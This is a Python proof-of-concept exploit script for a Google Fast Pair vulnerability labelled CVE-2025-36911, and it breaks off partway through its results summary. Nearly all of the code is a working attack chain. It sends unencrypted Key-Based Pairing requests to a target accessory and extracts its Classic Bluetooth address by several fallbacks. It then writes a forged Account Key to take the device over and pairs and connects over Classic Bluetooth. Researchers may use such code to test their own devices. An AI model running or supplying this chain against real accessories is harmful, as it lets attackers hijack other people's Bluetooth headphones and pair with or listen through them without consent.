#!/usr/bin/env python3
"""
WhisperPair PoC - CVE-2025-36911
================================

Proof of Concept for the WhisperPair vulnerability in Google Fast Pair.

KEY INSIGHT: Vulnerable devices accept RAW unencrypted Key-Based Pairing
requests - we don't need the Anti-Spoofing Public Key at all!

The exploit:
1. Send raw KBP request with salt (salt becomes shared secret)
2. Device responds with encrypted BR/EDR address
3. Parse response to extract BR/EDR address
4. Pair via Classic Bluetooth
5. Write Account Key to hijack device

For security research and testing on YOUR OWN devices only.

References:
- CVE-2025-36911
- https://whisperpair.eu
"""

import os
import re
import asyncio
import struct
import subprocess
import secrets
from datetime import datetime
from collections import Counter
from dataclasses import dataclass
from enum import IntEnum
from typing import Optional, List, Callable
from bleak import BleakClient, BleakScanner
from bleak.exc import BleakError
from colorama import init, Fore, Style
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import math

init()


# ==============================================================================
# CONSTANTS
# ==============================================================================

# Fast Pair Service and Characteristics
SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"
CHAR_MODEL_ID = "fe2c1233-8366-4814-8eb0-01de32100bea"
CHAR_KEY_PAIRING = "fe2c1234-8366-4814-8eb0-01de32100bea"
CHAR_PASSKEY = "fe2c1235-8366-4814-8eb0-01de32100bea"
CHAR_ACCOUNT_KEY = "fe2c1236-8366-4814-8eb0-01de32100bea"

# GATT Device Information Service
CHAR_SYSTEM_ID = "00002a23-0000-1000-8000-00805f9b34fb"


class MessageType(IntEnum):
    KEY_BASED_PAIRING_REQUEST = 0x00
    KEY_BASED_PAIRING_RESPONSE = 0x01
    SEEKER_PASSKEY = 0x02
    PROVIDER_PASSKEY = 0x03


class ExploitStrategy(IntEnum):
    """Exploit strategies - tried in order until one succeeds"""
    RAW_KBP = 0           # Raw unencrypted (most common for vulnerable devices)
    RAW_WITH_SEEKER = 1   # Raw with seeker address for bonding
    RETROACTIVE = 2       # With retroactive pairing flag
    EXTENDED_RESPONSE = 3 # Request extended response format


# ==============================================================================
# EXPLOIT RESULT TYPES
# ==============================================================================

@dataclass
class ExploitResult:
    success: bool
    vulnerable: bool
    br_edr_address: Optional[str]
    paired: bool
    account_key_written: bool
    message: str
    notifications: List[dict]


# ==============================================================================
# AES CRYPTO (Simple - using salt as shared secret)
# ==============================================================================

def aes_encrypt(key: bytes, data: bytes) -> bytes:
    """AES-128-ECB encrypt"""
    if len(key) < 16:
        key = key.ljust(16, b'\x00')
    cipher = Cipher(algorithms.AES(key[:16]), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()


def aes_decrypt(key: bytes, data: bytes) -> bytes:
    """AES-128-ECB decrypt"""
    if len(key) < 16:
        key = key.ljust(16, b'\x00')
    cipher = Cipher(algorithms.AES(key[:16]), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data) + decryptor.finalize()


# ==============================================================================
# REQUEST BUILDERS
# ==============================================================================

def build_raw_kbp_request(target_address: str) -> tuple[bytes, bytes]:
    """
    Build a raw Key-Based Pairing request.

    This is the key insight: vulnerable devices accept unencrypted requests!
    The salt becomes our "shared secret" for decrypting responses.

    Returns: (request_bytes, shared_secret)
    """
    address_bytes = bytes.fromhex(target_address.replace(':', ''))
    salt = secrets.token_bytes(8)

    request = bytearray(16)
    request[0] = MessageType.KEY_BASED_PAIRING_REQUEST  # 0x00
    request[1] = 0x11  # Flags: INITIATE_BONDING (bit 0) + EXTENDED_RESPONSE (bit 4)
    request[2:8] = address_bytes
    request[8:16] = salt

    # Salt becomes shared secret (padded to 16 bytes)
    shared_secret = salt + bytes(8)

    return bytes(request), shared_secret


def build_retroactive_request(target_address: str, seeker_address: str = "00:00:00:00:00:00") -> tuple[bytes, bytes]:
    """Build request with retroactive pairing flag (bypasses some checks)"""
    target_bytes = bytes.fromhex(target_address.replace(':', ''))
    seeker_bytes = bytes.fromhex(seeker_address.replace(':', ''))
    salt = secrets.token_bytes(2)

    request = bytearray(16)
    request[0] = MessageType.KEY_BASED_PAIRING_REQUEST
    request[1] = 0x0A  # Flags: Bit 1 (bonding) + Bit 3 (retroactive)
    request[2:8] = target_bytes
    request[8:14] = seeker_bytes
    request[14:16] = salt

    shared_secret = secrets.token_bytes(16)
    return bytes(request), shared_secret


def build_extended_request(target_address: str) -> tuple[bytes, bytes]:
    """Build request for extended response format"""
    address_bytes = bytes.fromhex(target_address.replace(':', ''))
    salt = secrets.token_bytes(8)

    request = bytearray(16)
    request[0] = MessageType.KEY_BASED_PAIRING_REQUEST
    request[1] = 0x10  # Bit 4: Request extended response
    request[2:8] = address_bytes
    request[8:16] = salt

    shared_secret = salt + bytes(8)
    return bytes(request), shared_secret


# ==============================================================================
# RESPONSE PARSING
# ==============================================================================

def calculate_entropy(data: bytes) -> float:
    """Calculate Shannon entropy"""
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    return -sum((c/length) * math.log2(c/length) for c in counts.values())


def is_valid_mac(address: str) -> bool:
    """Check if address looks like a valid Bluetooth MAC"""
    if address in ("00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF"):
        return False
    parts = address.split(':')
    if len(parts) != 6:
        return False
    try:
        return all(0 <= int(p, 16) <= 255 for p in parts)
    except ValueError:
        return False



def parse_system_id(data: bytes) -> Optional[str]:
    """Extract BD_ADDR from a GATT System ID (0x2A23) characteristic value.

    System ID is an 8-byte EUI-64 derived from the device's BD_ADDR:
      BD_ADDR  AA:BB:CC:DD:EE:FF
      EUI-64   AA:BB:CC:FF:FE:DD:EE:FF  (0xFFFE inserted in the middle)

    The GATT characteristic stores this LSO-first:
      Bytes 0-4: Manufacturer ID (LSO first) → FF:EE:DD:FE:FF
      Bytes 5-7: OUI (LSO first)             → CC:BB:AA

    Returns the BD_ADDR as a colon-separated MAC string, or None.
    """
    if len(data) != 8:
        return None

    # Check for the 0xFFFE marker that indicates EUI-48 → EUI-64 conversion
    if data[3] != 0xFE or data[4] != 0xFF:
        return None

    # Reconstruct BD_ADDR: OUI (bytes 5-7 reversed) + Manuf ID (bytes 0-2 reversed)
    oui = data[7], data[6], data[5]
    manuf = data[2], data[1], data[0]
    bd_addr = ':'.join(f'{b:02X}' for b in (*oui, *manuf))

    if not is_valid_mac(bd_addr):
        return None
    return bd_addr


async def resolve_identity_address(ble_address: str, timeout: float = 15.0,
                                    status_cb: Callable = None) -> Optional[str]:
    """Pair via BLE SMP and read the resolved identity address from BlueZ.

    After BLE pairing, BlueZ resolves the random advertising address to the
    device's identity address (which is the BR/EDR public address for
    dual-mode devices).

    Args:
        ble_address: The BLE random address to pair with
        timeout: Maximum time to wait for pairing
        status_cb: Optional callback(msg) for progress updates

    Returns:
        The resolved public/BR/EDR address, or None.
    """
    from dbus_fast.aio import MessageBus
    from dbus_fast import BusType, Variant

    BLUEZ_SERVICE = "org.bluez"
    DEVICE_IFACE = "org.bluez.Device1"
    PROPERTIES_IFACE = "org.freedesktop.DBus.Properties"
    OBJECT_MANAGER_IFACE = "org.freedesktop.DBus.ObjectManager"

    def log(msg):
        if status_cb:
            status_cb(msg)
        else:
            print(f"[identity] {msg}")

    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
    try:
        # Find the device object in BlueZ
        introspection = await bus.introspect(BLUEZ_SERVICE, "/")
        obj_manager = bus.get_proxy_object(BLUEZ_SERVICE, "/", introspection)
        manager = obj_manager.get_interface(OBJECT_MANAGER_IFACE)
        objects = await manager.call_get_managed_objects()

        addr_normalized = ble_address.upper().replace(":", "_")
        device_path = None
        for path in objects:
            if addr_normalized in path:
                device_path = path
                break

        if not device_path:
            log(f"Device {ble_address} not found in BlueZ — trying scan first")
            # Quick discovery to make BlueZ aware of the device
            adapter_path = None
            for path, ifaces in objects.items():
                if "org.bluez.Adapter1" in ifaces:
                    adapter_path = path
                    break
            if adapter_path:
                adapter_intro = await bus.introspect(BLUEZ_SERVICE, adapter_path)
                adapter_obj = bus.get_proxy_object(BLUEZ_SERVICE, adapter_path, adapter_intro)
                adapter = adapter_obj.get_interface("org.bluez.Adapter1")
                try:
                    await adapter.call_start_discovery()
                    await asyncio.sleep(5)
                    await adapter.call_stop_discovery()
                except Exception:
                    pass

            # Re-scan objects
            objects = await manager.call_get_managed_objects()
            for path in objects:
                if addr_normalized in path:
                    device_path = path
                    break

        if not device_path:
            log(f"Device {ble_address} still not found in BlueZ")
            return None

        # Get device interface
        dev_intro = await bus.introspect(BLUEZ_SERVICE, device_path)
        dev_obj = bus.get_proxy_object(BLUEZ_SERVICE, device_path, dev_intro)
        device = dev_obj.get_interface(DEVICE_IFACE)
        props = dev_obj.get_interface(PROPERTIES_IFACE)

        # Check if already paired and address already resolved
        addr_type_var = await props.call_get(DEVICE_IFACE, "AddressType")
        addr_var = await props.call_get(DEVICE_IFACE, "Address")
        if addr_type_var.value == "public" and addr_var.value.upper() != ble_address.upper():
            log(f"Already resolved: {addr_var.value} (public)")
            return addr_var.value.upper()

        # Pair to trigger SMP and identity address exchange
        log("BLE SMP pairing to resolve identity address...")
        try:
            await asyncio.wait_for(device.call_pair(), timeout=timeout)
        except asyncio.TimeoutError:
            log("Pairing timed out")
            return None
        except Exception as e:
            if "AlreadyExists" in str(e):
                log("Already paired")
            else:
                log(f"Pairing failed: {e}")
                return None

        # After pairing, BlueZ may have moved the device to a new path
        # under its identity address. Re-scan managed objects.
        await asyncio.sleep(1)
        objects = await manager.call_get_managed_objects()

        # Check all devices for a newly-resolved public address
        for path, ifaces in objects.items():
            if DEVICE_IFACE not in ifaces:
                continue
            dev_props = ifaces[DEVICE_IFACE]

            addr = dev_props.get("Address")
            addr_val = addr.value if hasattr(addr, "value") else addr
            addr_type = dev_props.get("AddressType")
            type_val = addr_type.value if hasattr(addr_type, "value") else addr_type

            if type_val == "public" and addr_val and addr_val.upper() != ble_address.upper():
                # Verify this is related to our device (same path root or paired recently)
                paired = dev_props.get("Paired")
                paired_val = paired.value if hasattr(paired, "value") else paired
                if paired_val:
                    log(f"Identity address resolved: {addr_val}")
                    return addr_val.upper()

        # Also re-read the original device path (BlueZ may update in-place)
        try:
            dev_intro = await bus.introspect(BLUEZ_SERVICE, device_path)
            dev_obj = bus.get_proxy_object(BLUEZ_SERVICE, device_path, dev_intro)
            props = dev_obj.get_interface(PROPERTIES_IFACE)
            addr_type_var = await props.call_get(DEVICE_IFACE, "AddressType")
            addr_var = await props.call_get(DEVICE_IFACE, "Address")
            if addr_type_var.value == "public":
                log(f"Identity address resolved (in-place): {addr_var.value}")
                return addr_var.value.upper()
        except Exception:
            pass

        log("Pairing completed but identity address not resolved")
        return None
    finally:
        bus.disconnect()


def extract_address(data: bytes, offset: int) -> str:
    """Extract MAC address from bytes at offset"""
    if offset + 6 > len(data):
        return "00:00:00:00:00:00"
    return ':'.join(f'{b:02X}' for b in data[offset:offset+6])


def parse_kbp_response(data: bytes, shared_secret: Optional[bytes] = None,
                       ble_address: Optional[str] = None) -> Optional[str]:
    """
    Parse a KBP response notification to extract the BR/EDR address.
    Returns BR/EDR address if found, None otherwise.

    Args:
        data: Raw KBP notification bytes
        shared_secret: Shared secret for decryption attempts
        ble_address: The BLE scan address (unused, kept for API compat)

    Strategies (in order):
    1. Standard response format (type 0x01, address at offset 1)
    2. Extended response format (type 0x02, address count + addresses)
    3. Decrypt with shared secret, then check standard format
    """
    if len(data) < 7:
        return None

    # Strategy 1: Standard response format (type 0x01)
    if data[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
        addr = extract_address(data, 1)
        if is_valid_mac(addr):
            return addr

    # Strategy 2: Extended response format (type 0x02)
    if data[0] == 0x02 and len(data) >= 9:
        addr_count = data[2]
        if addr_count >= 1:
            addr = extract_address(data, 3)
            if is_valid_mac(addr):
                return addr

    # Strategy 3: Decrypt with shared secret, then check standard format
    if shared_secret and len(data) == 16:
        # Try multiple key derivations
        keys_to_try = [shared_secret]

        # Also try the raw salt (first 8 bytes of shared secret, zero-padded)
        if len(shared_secret) >= 8:
            keys_to_try.append(shared_secret[:8].ljust(16, b'\x00'))

        # Try reversed shared secret
        keys_to_try.append(shared_secret[::-1])

        for key in keys_to_try:
            try:
                decrypted = aes_decrypt(key, data)

                # Check for standard response format in decrypted data
                if decrypted[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
                    addr = extract_address(decrypted, 1)
                    if is_valid_mac(addr):
                        return addr
            except Exception:
                continue

    # No brute-force scanning — too many false positives on random data.
    # If the response doesn't follow the standard format, the address must
    # be resolved via other means (System ID, SMP identity, inquiry, etc.).
    return None


# ==============================================================================
# BR/EDR ADDRESS DISCOVERY VIA CLASSIC INQUIRY
# ==============================================================================

def discover_bredr_address(device_name: str, ble_address: str = None,
                           timeout: int = 12, status_cb: Callable = None) -> Optional[str]:
    """Discover the BR/EDR (Classic BT) address of a device by running an
    inquiry scan and matching on device name and/or OUI prefix.

    Args:
        device_name: Name learned during BLE connection (e.g. "Pixel Buds Pro")
        ble_address: BLE address for OUI-prefix tie-breaking
        timeout: Inquiry duration in seconds
        status_cb: Optional callback(msg) for progress updates

    Returns:
        BR/EDR MAC address string, or None if not found.
    """
    def log(msg):
        if status_cb:
            status_cb(msg)
        else:
            print(f"{Fore.BLUE}[inquiry] {msg}{Style.RESET_ALL}")

    if not device_name or device_name == "Unknown":
        log("No device name available for Classic BT inquiry")
        return None

    log(f"Starting Classic BT inquiry for '{device_name}' ({timeout}s)...")

    # Use bluetoothctl to scan for BR/EDR devices
    # First ensure the adapter is powered and classic scan is on
    try:
        subprocess.run(["bluetoothctl", "power", "on"],
                       capture_output=True, text=True, timeout=5)
    except Exception:
        pass

    # Run inquiry via hcitool inq (returns addr + class + clock offset)
    try:
        inq_result = subprocess.run(
            ["hcitool", "inq", "--length", str(max(timeout // 1, 1))],
            capture_output=True, text=True, timeout=timeout + 10
        )
        inq_output = inq_result.stdout
    except subprocess.TimeoutExpired:
        log("Inquiry timed out")
        inq_output = ""
    except FileNotFoundError:
        log("hcitool not found, falling back to bluetoothctl")
        inq_output = ""

    # Parse inquiry results: lines like "	AA:BB:CC:DD:EE:FF	clock offset: ...	class: ..."
    candidates = []
    for line in inq_output.splitlines():
        match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line)
        if match:
            candidates.append(match.group(1).upper())

    if not candidates:
        # Fallback: try bluetoothctl scan for a short burst
        log("No devices from hcitool inq, trying bluetoothctl scan...")
        try:
            scan_proc = subprocess.Popen(
                ["bluetoothctl", "scan", "bredr"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
            end_time = datetime.now().timestamp() + timeout
            while datetime.now().timestamp() < end_time:
                line = scan_proc.stdout.readline()
                if not line:
                    break
                match = re.search(r'Device\s+([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(.*)', line)
                if match:
                    addr = match.group(1).upper()
                    name = match.group(2).strip()
                    if device_name.lower() in name.lower():
                        scan_proc.terminate()
                        log(f"Found '{name}' at {addr} via bluetoothctl scan")
                        return addr
                    candidates.append(addr)
            scan_proc.terminate()
        except Exception as e:
            log(f"bluetoothctl scan failed: {e}")

    if not candidates:
        log("No BR/EDR devices found in range")
        return None

    log(f"Found {len(candidates)} BR/EDR device(s), resolving names...")

    # Resolve names and match
    ble_oui = ble_address[:8].upper() if ble_address and len(ble_address) >= 8 else None
    name_matches = []
    oui_matches = []

    for addr in candidates:
        try:
            name_result = subprocess.run(
                ["hcitool", "name", addr],
                capture_output=True, text=True, timeout=8
            )
            resolved_name = name_result.stdout.strip()
        except Exception:
            resolved_name = ""

        log(f"  {addr} -> '{resolved_name}'")

        if resolved_name and device_name.lower() in resolved_name.lower():
            name_matches.append(addr)
        elif ble_oui and addr[:8].upper() == ble_oui:
            oui_matches.append(addr)

    # Prefer name match; tie-break with OUI if multiple
    if name_matches:
        if len(name_matches) == 1:
            log(f"BR/EDR address found by name match: {name_matches[0]}")
            return name_matches[0]
        # Multiple name matches — prefer OUI overlap
        if ble_oui:
            for addr in name_matches:
                if addr[:8].upper() == ble_oui:
                    log(f"BR/EDR address found by name + OUI match: {addr}")
                    return addr
        log(f"BR/EDR address found by name match (first of {len(name_matches)}): {name_matches[0]}")
        return name_matches[0]

    if oui_matches:
        log(f"BR/EDR address found by OUI match: {oui_matches[0]}")
        return oui_matches[0]

    log("No BR/EDR address matched by name or OUI")
    return None


# ==============================================================================
# CLASSIC BLUETOOTH PAIRING (via bluetoothctl)
# ==============================================================================

def run_cmd(cmd: str, timeout: int = 30) -> tuple[str, int]:
    """Run shell command"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout + result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "Timeout", -1
    except Exception as e:
        return str(e), -1


def pair_classic_bluetooth(mac: str) -> bool:
    """Pair with device via bluetoothctl"""
    print(f"{Fore.BLUE}[*] Initiating Classic Bluetooth pairing with {mac}...{Style.RESET_ALL}")

    # Trust first (helps with some devices)
    run_cmd(f"bluetoothctl trust {mac}")

    # Pair
    output, code = run_cmd(f"bluetoothctl pair {mac}", timeout=25)

    if "successful" in output.lower():
        print(f"{Fore.GREEN}[+] Pairing successful!{Style.RESET_ALL}")
        return True
    elif "already paired" in output.lower():
        print(f"{Fore.YELLOW}[!] Device already paired{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.RED}[-] Pairing failed: {output[:100]}{Style.RESET_ALL}")
        return False


def connect_classic_bluetooth(mac: str) -> bool:
    """Connect to paired device"""
    print(f"{Fore.BLUE}[*] Connecting to {mac}...{Style.RESET_ALL}")
    output, code = run_cmd(f"bluetoothctl connect {mac}", timeout=15)

    if "successful" in output.lower():
        print(f"{Fore.GREEN}[+] Connected!{Style.RESET_ALL}")
        return True
    else:
        print(f"{Fore.YELLOW}[-] Connection failed{Style.RESET_ALL}")
        return False


# ==============================================================================
# MAIN EXPLOIT CLASS
# ==============================================================================

class WhisperPairExploit:
    """
    WhisperPair CVE-2025-36911 Exploit

    Exploits the fact that vulnerable Fast Pair devices accept
    Key-Based Pairing requests even when NOT in pairing mode.
    """

    def __init__(self, target_address: str):
        self.target_address = target_address
        self.client: Optional[BleakClient] = None
        self.notifications: List[dict] = []
        self.shared_secret: Optional[bytes] = None
        self.br_edr_address: Optional[str] = None
        self.model_id: Optional[str] = None
        self.kbp_response: Optional[bytes] = None
        self.notification_event = asyncio.Event()

    def _notification_handler(self, sender, data: bytes):
        """Handle GATT notifications"""
        char_uuid = str(sender.uuid).lower() if hasattr(sender, 'uuid') else str(sender)

        entry = {
            'characteristic': char_uuid,
            'data': data,
            'hex': data.hex(),
            'length': len(data),
            'entropy': calculate_entropy(data),
            'timestamp': datetime.now().isoformat()
        }
        self.notifications.append(entry)

        print(f"\n{Fore.CYAN}{'─' * 50}")
        print(f"📥 NOTIFICATION ({len(data)} bytes)")
        print(f"{'─' * 50}{Style.RESET_ALL}")
        print(f"Raw: {data.hex()}")
        print(f"Entropy: {entry['entropy']:.2f} bits/byte")

        # Check if this is a KBP response
        if "1234" in char_uuid:
            self.kbp_response = data

            # Try to parse BR/EDR address
            addr = parse_kbp_response(data, self.shared_secret, ble_address=self.target_address)
            if addr:
                self.br_edr_address = addr
                print(f"{Fore.GREEN}BR/EDR Address: {addr}{Style.RESET_ALL}")
            else:
                # Fallback: use BLE address
                print(f"{Fore.YELLOW}Could not parse BR/EDR, will use BLE address{Style.RESET_ALL}")

        print(f"{Fore.CYAN}{'─' * 50}{Style.RESET_ALL}\n")
        self.notification_event.set()

    async def connect(self, max_retries: int = 3) -> bool:
        """Connect to target device with exponential backoff"""
        for attempt in range(1, max_retries + 1):
            backoff = 2 ** (attempt - 1)  # 1s, 2s, 4s
            print(f"{Fore.BLUE}[*] Connecting to {self.target_address} (attempt {attempt}/{max_retries})...{Style.RESET_ALL}")

            try:
                self.client = BleakClient(self.target_address, timeout=15.0)
                await self.client.connect()

                if self.client.is_connected:
                    print(f"{Fore.GREEN}[+] Connected!{Style.RESET_ALL}")
                    return True
            except Exception as e:
                print(f"{Fore.YELLOW}[-] Attempt {attempt} failed: {e}{Style.RESET_ALL}")
                if attempt < max_retries:
                    print(f"{Fore.BLUE}[*] Retrying in {backoff}s...{Style.RESET_ALL}")
                    await asyncio.sleep(backoff)

        print(f"{Fore.RED}[-] Connection failed after {max_retries} attempts{Style.RESET_ALL}")
        return False

    async def negotiate_mtu(self, preferred_mtu: int = 83) -> int:
        """Request MTU negotiation for reliable GATT operations"""
        try:
            current_mtu = self.client.mtu_size
            print(f"{Fore.BLUE}[*] Current MTU: {current_mtu}, preferred: {preferred_mtu}{Style.RESET_ALL}")
            if current_mtu >= preferred_mtu:
                print(f"{Fore.GREEN}[+] MTU already sufficient: {current_mtu}{Style.RESET_ALL}")
                return current_mtu
            print(f"{Fore.BLUE}[*] Using negotiated MTU: {current_mtu}{Style.RESET_ALL}")
            return current_mtu
        except Exception as e:
            print(f"{Fore.YELLOW}[!] MTU negotiation not supported: {e}{Style.RESET_ALL}")
            return 23  # Default BLE MTU

    async def disconnect(self):
        """Disconnect from device"""
        if self.client and self.client.is_connected:
            await self.client.disconnect()

    async def read_model_id(self) -> Optional[str]:
        """Read device Model ID"""
        try:
            data = await self.client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                self.model_id = f"0x{model_id:06X}"
                print(f"{Fore.BLUE}[*] Model ID: {self.model_id}{Style.RESET_ALL}")
                return self.model_id
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Could not read Model ID: {e}{Style.RESET_ALL}")
        return None

    async def read_system_id(self) -> Optional[str]:
        """Try reading System ID (0x2A23) to extract BR/EDR address."""
        try:
            data = await self.client.read_gatt_char(CHAR_SYSTEM_ID)
            addr = parse_system_id(data)
            if addr:
                print(f"{Fore.GREEN}[+] BR/EDR address from System ID: {addr}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] System ID present but not BD_ADDR-derived: {data.hex()}{Style.RESET_ALL}")
            return addr
        except Exception:
            return None  # System ID not available

    async def subscribe_notifications(self):
        """Subscribe to Fast Pair notifications"""
        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await self.client.start_notify(char_uuid, self._notification_handler)
                print(f"{Fore.GREEN}[+] Subscribed to notifications{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Could not subscribe: {e}{Style.RESET_ALL}")

    async def send_kbp_request(self, strategy: ExploitStrategy) -> bool:
        """Send Key-Based Pairing request with given strategy"""

        # Build request based on strategy
        if strategy == ExploitStrategy.RAW_KBP:
            request, self.shared_secret = build_raw_kbp_request(self.target_address)
            strategy_name = "RAW_KBP"
        elif strategy == ExploitStrategy.RETROACTIVE:
            request, self.shared_secret = build_retroactive_request(self.target_address)
            strategy_name = "RETROACTIVE"
        elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
            request, self.shared_secret = build_extended_request(self.target_address)
            strategy_name = "EXTENDED"
        else:
            request, self.shared_secret = build_raw_kbp_request(self.target_address)
            strategy_name = "RAW"

        print(f"\n{Fore.BLUE}[*] Sending KBP Request ({strategy_name}){Style.RESET_ALL}")
        print(f"    Request: {request.hex()}")

        try:
            self.notification_event.clear()
            await self.client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)
            print(f"{Fore.RED}[!] KBP WRITE ACCEPTED - Device is VULNERABLE!{Style.RESET_ALL}")

            # Wait for response notification
            print(f"{Fore.BLUE}[*] Waiting for device response...{Style.RESET_ALL}")
            try:
                await asyncio.wait_for(self.notification_event.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                print(f"{Fore.YELLOW}[!] No notification received (timeout){Style.RESET_ALL}")

            return True

        except Exception as e:
            error_str = str(e).lower()
            if "not permitted" in error_str or "rejected" in error_str:
                print(f"{Fore.GREEN}[+] KBP rejected (device may be patched){Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[-] KBP write failed: {e}{Style.RESET_ALL}")
            return False

    async def write_account_key(self) -> bool:
        """Write Account Key to hijack device"""
        print(f"\n{Fore.BLUE}[*] Writing Account Key...{Style.RESET_ALL}")

        # Generate account key (starts with 0x04)
        account_key = bytearray(16)
        account_key[0] = 0x04
        account_key[1:16] = secrets.token_bytes(15)

        # Encrypt if we have shared secret
        if self.shared_secret:
            data_to_write = aes_encrypt(self.shared_secret, bytes(account_key))
        else:
            data_to_write = bytes(account_key)

        print(f"    Account Key: {bytes(account_key).hex()}")

        try:
            await self.client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
            print(f"{Fore.GREEN}[+] Account Key written successfully!{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Account Key write failed: {e}{Style.RESET_ALL}")
            return False

    async def run_exploit(self) -> ExploitResult:
        """Run the full exploit chain"""

        print(f"\n{'='*60}")
        print(f"{Fore.RED}WhisperPair PoC - CVE-2025-36911{Style.RESET_ALL}")
        print(f"{'='*60}")
        print(f"Target: {self.target_address}")
        print(f"Time: {datetime.now().isoformat()}")
        print(f"\n{Fore.YELLOW}[!] Ensure device is NOT in pairing mode for valid test!{Style.RESET_ALL}")

        result = ExploitResult(
            success=False,
            vulnerable=False,
            br_edr_address=None,
            paired=False,
            account_key_written=False,
            message="",
            notifications=[]
        )

        try:
            # Step 1: Connect
            if not await self.connect():
                result.message = "Connection failed"
                return result

            # Step 1.5: Negotiate MTU
            await self.negotiate_mtu()

            # Step 2: Read Model ID
            await self.read_model_id()

            # Step 2.5: Try System ID for BR/EDR address (free, no pairing)
            system_id_address = await self.read_system_id()

            # Step 3: Subscribe to notifications
            await self.subscribe_notifications()
            await asyncio.sleep(0.5)

            # Step 4: Try exploit strategies
            strategies = [
                ExploitStrategy.RAW_KBP,
                ExploitStrategy.EXTENDED_RESPONSE,
                ExploitStrategy.RETROACTIVE,
            ]

            kbp_accepted = False
            for strategy in strategies:
                print(f"\n{Fore.CYAN}{'─'*60}")
                print(f"Trying strategy: {strategy.name}")
                print(f"{'─'*60}{Style.RESET_ALL}")

                if await self.send_kbp_request(strategy):
                    kbp_accepted = True
                    result.vulnerable = True
                    break

                await asyncio.sleep(1)

            if not kbp_accepted:
                result.message = "All strategies rejected - device appears patched"
                return result

            # Step 5: Write Account Key WHILE STILL CONNECTED
            await asyncio.sleep(0.5)
            result.account_key_written = await self.write_account_key()

            # Get device name for Classic BT inquiry fallback.
            # Try BLE advertisement name first (from Bleak), then GATT 0x2A00.
            device_name = None
            if self.client and self.client.is_connected:
                # Bleak exposes the advertised name via the underlying device object
                try:
                    ble_dev = self.client._device_info  # bleak internals
                    if hasattr(ble_dev, 'name') and ble_dev.name:
                        device_name = ble_dev.name
                except Exception:
                    pass
                # Fallback: try GATT Device Name characteristic
                if not device_name:
                    try:
                        for service in self.client.services:
                            for char in service.characteristics:
                                if "2a00" in str(char.uuid).lower():
                                    raw = await self.client.read_gatt_char(char.uuid)
                                    device_name = raw.decode("utf-8", errors="ignore").strip()
                                    break
                            if device_name:
                                break
                    except Exception:
                        pass
                if device_name:
                    print(f"{Fore.BLUE}[*] Device name: {device_name}{Style.RESET_ALL}")

            # Step 6: Disconnect BLE
            await self.disconnect()

            # Step 7: Determine BR/EDR address
            if not self.br_edr_address:
                print(f"{Fore.YELLOW}[!] KBP response did not contain BR/EDR address, "
                      f"trying fallbacks...{Style.RESET_ALL}")

                # Fallback A: System ID
                if system_id_address:
                    self.br_edr_address = system_id_address
                    print(f"{Fore.GREEN}[+] Using BR/EDR from System ID: {system_id_address}{Style.RESET_ALL}")

                # Fallback B: Classic BT inquiry (by device name)
                if not self.br_edr_address and device_name and device_name != "Unknown":
                    print(f"{Fore.BLUE}[*] Running Classic BT inquiry for '{device_name}'...{Style.RESET_ALL}")
                    inquiry_addr = discover_bredr_address(
                        device_name=device_name,
                        ble_address=self.target_address,
                    )
                    if inquiry_addr:
                        self.br_edr_address = inquiry_addr
                        print(f"{Fore.GREEN}[+] BR/EDR via inquiry: {inquiry_addr}{Style.RESET_ALL}")

                if not self.br_edr_address:
                    print(f"{Fore.RED}[!] Could not determine BR/EDR address.{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}    Use the phone companion app or provide the address manually.{Style.RESET_ALL}")

            result.br_edr_address = self.br_edr_address

            # Step 8: Pair via Classic Bluetooth (if BR/EDR address known)
            if self.br_edr_address:
                print(f"\n{Fore.CYAN}{'─'*60}")
                print(f"Classic Bluetooth Pairing")
                print(f"{'─'*60}{Style.RESET_ALL}")

                result.paired = pair_classic_bluetooth(self.br_edr_address)

                if result.paired:
                    connect_classic_bluetooth(self.br_edr_address)

            result.success = result.vulnerable and result.account_key_written
            result.notifications = self.notifications

            if result.success:
                result.message = "Exploit successful!"
            else:
                result.message = "Partial success - device is vulnerable"

            return result

        except Exception as e:
            result.message = f"Error: {e}"
            return result

        finally:
            await self.disconnect()

    def print_summary(self, result: ExploitResult):
        """Print exploit summary"""
        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}EXPLOIT RESULTS{Style.RESET_ALL}")
        print(f"{'='*60}")

        if result.vulnerable:
            print(f"\n{Fore.RED}╔════════════════════════════════════════════════════════╗")
            print(f"║  ⚠️  DEVICE IS VULNERABLE TO CVE-2025-36911  ⚠️          ║")
            print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[+] Device appears to be patched{Style.RESET_ALL}")
            return

        print(f"\n{Fore.YELLOW}Results:{Style.RESET_ALL}")
        print(f"  Model ID: {self.model_id or 'Unknown'}")
